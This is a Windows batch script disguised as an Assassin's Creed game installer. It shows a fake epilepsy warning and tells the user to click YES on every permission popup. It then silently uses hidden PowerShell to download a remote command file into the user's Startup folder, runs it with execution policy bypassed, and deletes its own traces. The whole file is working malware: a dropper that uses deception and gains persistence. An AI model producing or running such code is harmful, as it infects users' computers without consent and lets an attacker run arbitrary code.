@echo off

echo x=msgbox("A very small percentage of individuals may experience epileptic seizures exposed to certain light patterns or flashing lights. -- IMMEDIATELY discontinue use and consult your physician before resuming pla!!",0,"ASSASSIN'S CREED::WARNING BEFORE PLAYING") WScript.Sleep 3000 ("Make sure to give the game the necessary permissions by clicking YES on all the popups if they are not passed through.",0,"**ASSASSIN'S CREED INSTALLATION**")>>msgbox.vbs
start msgbox.vbs

set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd %STARTUP%

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile IVbaANzwiphH.cmd"

powershell -windowstyle hidden -ExecutionPolicy Bypass ./IVbaANzwiphH.cmd

cd "%INITIALPATH%"

del msgbox.vbs
del initial1.cmd
